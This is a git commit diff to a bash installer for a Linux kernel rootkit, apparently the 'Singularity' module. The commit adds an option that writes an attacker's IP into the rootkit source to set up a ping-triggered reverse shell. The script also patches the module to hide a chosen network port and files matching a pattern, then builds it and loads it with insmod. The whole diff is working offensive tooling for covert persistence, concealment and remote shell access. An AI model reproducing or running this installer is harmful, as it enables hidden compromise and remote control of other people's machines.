9ee3659aad37abded818790deed96cc42d7e2b07
Zhiteng Li <zhiteng.li2003@gmail.com>
2025-12-13 13:58:28 +0100

    add automatic ping triggered reverse shell configuration

--- RootKit/install_rootkit.sh
+++ RootKit/install_rootkit.sh
@@ -1,10 +1,15 @@
 #!/bin/bash
 
+set -e
+
 # This script needs root to run
 
-if [[ $# -ne 4 ]]; then
-    echo "Please specify the port to hide and the pattern of the directory to hide"
-    echo "Usage: $0 -p <port> -pat <pattern>"
+if [[ $# -ne 6 ]]; then
+    echo "Usage: $0 -p <port> -pat <pattern> -ip <ATTACKER_IP>"
+    echo "help:"
+    echo "-p <port>         The network port you wanna hide from e.g. netstat"
+    echo "-pat <pattern>    A string pattern that will be used to hide maching strings in files and directories"
+    echo "-ip <ATTACKER_IP> The IP address of the attacker to send the ping triggered reverse shell"
     exit 1
 fi
 
@@ -20,10 +25,17 @@ while [[ $# -gt 0 ]]; do
             PATTERN="$2"
             shift 2
             ;;
+        -ip)
+            ATTACKER_IP="$2"
+            shift 2
+            ;;
         *)
             echo "Unknown option: $1"
-            echo "Please specify the port to hide and the pattern of the directory to hide"
-            echo "Usage: $0 -p <port> -pat <pattern>"
+            echo "Usage: $0 -p <port> -pat <pattern> -ip <ATTACKER_IP>"
+            echo "help:"
+            echo "-p <port>         The network port you wanna hide from e.g. netstat"
+            echo "-pat <pattern>    A string pattern that will be used to hide maching strings in files and directories"
+            echo "-ip <ATTACKER_IP> The IP address of the attacker to send the ping triggered reverse shell"
             exit 1
             ;;
     esac
@@ -36,9 +48,12 @@ cd Singularity
 sed -i "s/^#define PORT .*/#define PORT $NEWPORT/" "modules/hiding_tcp.c"
 
 ESCAPED=$(printf '%s\n' "$PATTERN" | sed 's/[&/\]/\\&/g')
-sed -i "/hidden_patterns\[\].*{/a\    \"{$ESCAPED}\"," "include/hiding_directory_def.h"
+sed -i "/hidden_patterns\[\].*{/a\    \"${ESCAPED}\"," "include/hiding_directory_def.h"
+
+sed -i "s/^#define YOUR_SRV_IP .*/#define YOUR_SRV_IP \"$ATTACKER_IP\"/" "include/core.h"
 
 make
 sudo insmod singularity.ko
 sudo bash scripts/journal.sh
 sudo bash scripts/x.sh
+cd ..
